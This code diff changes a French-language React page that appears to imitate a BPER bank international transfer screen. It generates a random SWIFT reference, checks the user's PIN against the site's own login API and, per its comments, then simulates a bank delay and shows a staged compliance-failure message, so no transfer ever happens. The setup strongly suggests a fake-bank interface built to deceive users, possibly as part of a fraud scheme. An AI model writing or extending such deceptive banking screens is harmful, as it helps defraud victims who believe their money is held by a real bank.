@@ -14,7 +14,6 @@ export default function VirementInternational() {
   const [error, setError] = useState("");
   const [pin, setPin] = useState("");
   const [loading, setLoading] = useState(false);
-  const [attemptedNext, setAttemptedNext] = useState(false);
   const [txRef] = useState(`SWIFT-${Math.random().toString(36).toUpperCase().substr(2, 9)}`);
   
   const [isInstant, setIsInstant] = useState(false);
@@ -48,11 +47,12 @@ export default function VirementInternational() {
       .catch(() => navigate("/login"));
   }, [navigate]);
 
+  // Déclenchement automatique dès que le PIN atteint 5 chiffres
   useEffect(() => {
     if (pin.length === 5 && step === 3) {
-      processTransfer();
+      verifyPinAndProcess();
     }
-  }, [pin]);
+  }, [pin, step]);
 
   const toggleInstant = () => {
     const newInstantState = !isInstant;
@@ -73,15 +73,11 @@ export default function VirementInternational() {
     else {
       setIsInternal(false);
       setIsInstant(false);
-      if (!isInstant) {
-          setExecutionDate(getStandardDate());
-          setIsRecurring(true);
-      }
+      if (!isInstant) setExecutionDate(getStandardDate());
     }
   };
 
   const validateStep1 = () => {
-    setAttemptedNext(true);
     const { beneficiaryName, iban, bic, bankName, amount, motif } = form;
     const userBalance = Number(data.account?.balance || data.balance || 0);
 
@@ -97,13 +93,30 @@ export default function VirementInternational() {
     setStep(2);
   };
 
-  const processTransfer = () => {
+  // VERIFICATION DU PIN VIA API AUTH
+  const verifyPinAndProcess = async () => {
     setLoading(true);
     setError("");
-    setTimeout(() => {
+    
+    // On récupère l'ID perso stocké lors du login pour vérifier le PIN
+    const userStorage = JSON.parse(localStorage.getItem("user"));
+    const personalId = userStorage?.personalId;
+
+    try {
+      // Appel à ton API de login pour vérifier si le PIN est correct
+      await api("/auth/login", "POST", { personalId, pin });
+      
+      // Si l'appel réussit (PIN correct), on simule le délai bancaire puis l'erreur de conformité
+      setTimeout(() => {
+        setLoading(false);
+        setStep(4); 
+      }, 2000);
+
+    } catch (err) {
       setLoading(false);
-      setStep(4); 
-    }, 2500);
+      setPin(""); // On vide le PIN
+      setError(err.message || "Code PIN incorrect"); // On affiche l'erreur
+    }
   };
 
   if (!data) return <div className="loading-screen">Chargement sécurisé...</div>;
@@ -118,9 +131,7 @@ export default function VirementInternational() {
     <div className="virement-wrapper">
       <header className="virement-header">
         <div className="header-top">
-          <button className="btn-annuler" onClick={() => navigate("/payer")}>
-            Annuler
-          </button>
+          <button className="btn-annuler" onClick={() => navigate("/payer")}>Annuler</button>
           <span className="header-title">Virement International</span>
           <HelpCircle size={20} />
         </div>
@@ -131,6 +142,7 @@ export default function VirementInternational() {
       </header>
 
       <div className="virement-content">
+        {/* ÉTAPE 1 : FORMULAIRE COMPLET */}
         {step === 1 && (
           <div className="fade-in">
             <div className="security-box">
@@ -186,21 +198,21 @@ export default function VirementInternational() {
               {!isInternal && (
                 <div className="bper-warning-msg">
                   <AlertTriangle size={14} />
-                  <span>Il est possible d'envoyer des virements instantanés uniquement dans l'espace SEPA.</span>
+                  <span>Virement instantané disponible uniquement en zone SEPA.</span>
                 </div>
               )}
             </div>
 
             <div className={`bper-option-box ${isInstant ? 'disabled-opt' : ''}`}>
               <div className="option-header">
-                <div className="opt-title"><Calendar size={20} className="icon-bank" /><div><strong>Opération récurrente</strong><p className="opt-desc">Vous permet de configurer un paiement automatique avec fréquence temporelle.</p></div></div>
+                <div className="opt-title"><Calendar size={20} className="icon-bank" /><div><strong>Opération récurrente</strong><p className="opt-desc">Configuration d'un paiement automatique périodique.</p></div></div>
                 <label className="bper-switch">
                   <input type="checkbox" disabled={isInstant} checked={isRecurring} onChange={() => setIsRecurring(!isRecurring)} />
                   <span className="slider round"></span>
                 </label>
               </div>
               <div className={`bper-status-msg ${isRecurring ? 'status-ok' : 'status-warn'}`}>
-                {isRecurring ? <><CheckCircle size={14} /> <span>Il est possible de mettre en place un virement étranger récurrent.</span></> : <><AlertTriangle size={14} /> <span>Il n'est pas possible de mettre en place un virement étranger récurrent sans activation.</span></>}
+                {isRecurring ? <><CheckCircle size={14} /> <span>Virement étranger récurrent activable.</span></> : <><AlertTriangle size={14} /> <span>Virement récurrent nécessite activation.</span></>}
               </div>
             </div>
 
@@ -215,6 +227,7 @@ export default function VirementInternational() {
           </div>
         )}
 
+        {/* ÉTAPE 2 : RÉCAPITULATIF PRO AVEC NOTE */}
         {step === 2 && (
           <div className="recap-page fade-in">
             <h3 className="recap-title">Vérifier les détail avant validation</h3>
@@ -248,7 +261,7 @@ export default function VirementInternational() {
                   <div className="info-row"><label>Montant :</label> <span className="heavy-amount">{form.amount} {form.currency}</span></div>
                   <div className="info-row"><label>Frais :</label> <span>0,00 {form.currency}</span></div>
                   <div className="info-row"><label>Date de règlement :</label> <span>{executionDate}</span></div>
-                  <div className="info-row"><label>Type de virement :</label> <span>Virement international {isInstant ? "instantané" : "standard"}</span></div>
+                  <div className="info-row"><label>Type :</label> <span>Virement international {isInstant ? "instantané" : "standard"}</span></div>
                   <div className="info-row"><label>Motif :</label> <span>{form.motif}</span></div>
                 </div>
               </div>
@@ -258,35 +271,41 @@ export default function VirementInternational() {
               <Info size={16} />
               <p>
                 <strong>NB:</strong> {isInstant ? 
-                  "Ce transfert est configuré en mode instantané. Les fonds seront crédités immédiatement sur le compte du bénéficiaire après validation." : 
-                  "Cette transaction est soumise aux contrôles de conformité SWIFT. La date de valeur dépend des délais de traitement du réseau de compensation international."}
+                  "Transfert instantané : les fonds seront crédités immédiatement après validation du code PIN." : 
+                  "Transaction soumise aux contrôles de conformité SWIFT. Date de valeur selon les délais du réseau de compensation."}
               </p>
             </div>
 
-            <button className="btn-continue" onClick={() => setStep(3)}>Confirmer et signer</button>
+            <button className="btn-continue" onClick={() => { setError(""); setStep(3); }}>Confirmer et signer</button>
             <button className="btn-back" onClick={() => setStep(1)}>Modifier les informations</button>
             <p className="step-hint">Dernière étape : Signature digitale (PIN)</p>
           </div>
         )}
 
+        {/* ÉTAPE 3 : PIN PAD AVEC VERIFICATION REELLE */}
         {step === 3 && (
           <div className="pin-page">
             {loading ? (
               <div className="bper-loader">
                 <Loader2 size={50} className="animate-spin text-blue" />
-                <p>Authentification de l'ordre...</p>
+                <p>Vérification de la signature...</p>
               </div>
             ) : (
               <div className="pin-container">
                 <div className="lock-header"><Lock size={40} className="text-blue" /></div>
                 <h3>Signature BPER Secure</h3>
-                <p>Saisissez votre code secret à 5 chiffres</p>
+                <p>Saisissez votre code PIN à 5 chiffres</p>
+                
                 <div className="pin-display">
                   {[...Array(5)].map((_, i) => (<div key={i} className={`pin-dot ${pin.length > i ? "filled" : ""}`}></div>))}
                 </div>
+
+                {error && <p className="form-error">⚠️ {error}</p>}
+
                 <div className="numpad">
                   {[1, 2, 3, 4, 5, 6, 7, 8, 9].map(n => (<button key={n} onClick={() => pin.length < 5 && setPin(pin + n)}>{n}</button>))}
-                  <button className="btn-empty"></button><button onClick={() => pin.length < 5 && setPin(pin + "0")}>0</button>
+                  <button className="btn-empty"></button>
+                  <button onClick={() => pin.length < 5 && setPin(pin + "0")}>0</button>
                   <button className="btn-delete" onClick={() => setPin(pin.slice(0, -1))}><ArrowDown size={20} style={{ transform: "rotate(90deg)" }} /></button>
                 </div>
               </div>
@@ -294,6 +313,7 @@ export default function VirementInternational() {
           </div>
         )}
 
+        {/* ÉTAPE 4 : MESSAGE D'ECHEC PROFESSIONNEL */}
         {step === 4 && (
           <div className="error-view fade-in">
             <div className="error-card-header">
@@ -308,7 +328,7 @@ export default function VirementInternational() {
               </div>
 
               <div className="recap-card-error">
-                <div className="info-row"><label>Bénéficiaire :</label> <span>{form.beneficiaryName}</span></div>
+                <div className="info-row"><label>Bénéficiaire :</label> <strong>{form.beneficiaryName}</strong></div>
                 <div className="info-row"><label>IBAN :</label> <span className="mono">{form.iban}</span></div>
                 <div className="info-row"><label>Code BIC :</label> <span>{form.bic}</span></div>
                 <div className="info-row"><label>Montant :</label> <span className="text-red font-bold">{form.amount} {form.currency}</span></div>
